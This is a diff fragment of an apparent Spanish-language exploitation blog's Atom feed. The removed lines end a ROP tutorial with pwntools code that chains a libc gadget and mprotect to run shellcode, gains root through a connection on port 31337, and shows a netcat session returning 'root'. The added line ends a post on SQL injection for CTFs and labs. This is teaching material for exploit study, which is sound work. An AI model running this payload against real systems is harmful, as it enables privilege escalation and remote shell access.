-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xAAAAAAAAAAAAAAAA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#junk para r15&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pop_rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mprotect_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x007fffffffe418&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#direccion desde donde comenzara la shellcode&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;&lt;strong&gt;Ojo:&lt;/strong&gt; Antes de ejecutarlo hay que ponernos en escucha por el puerto 31337, ya que la shellcode ejecuta un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setuid(0)&lt;/code&gt; y establece una conexion con nosotros mismos por ese puerto&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;󰣇  c4rta ~/Downloads  nc 192.168.1.76 31337 -v
-Connection to 192.168.1.76 31337 port [tcp/*] succeeded!
-whoami
-root
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;Y asi conseguimos ser root, muchas gracias por leer ❤&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/heap2/waifu3.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>c4rta</name></author><category term="ROP" /><summary type="html">En ocasiones se nos presenta la situacion donde tenemos el NX activado y tenemos que recurrir a tecnicas como ret2libc, ret2reg, mas que nada tecnicas que usen ROP. Asi que ahora te voy a mostrar como usar mprotect() para volver a marcar el stack como ejecutable y puedas inyectar una shellcode.</summary></entry></feed>
+&lt;p&gt;&lt;img src=&quot;/assets/img/UPDWP-SQLi/waifu.webp&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>c4rta</name></author><category term="SQL injection" /><category term="Union-Based SQL injection" /><category term="Blind-Based SQL injection" /><category term="Error-Based SQL injection" /><category term="Time-Based SQL injection" /><summary type="html">En esta seccion Un Poco De Web Pentesting mi intencion es explicar sin tanto tramite como explotar varias vulnerabilidades web tomando como ejemplo CTFs y laboratorios que me encuentro, ten en cuenta que este solo es un recurso mas de los que hay internet.</summary></entry></feed>
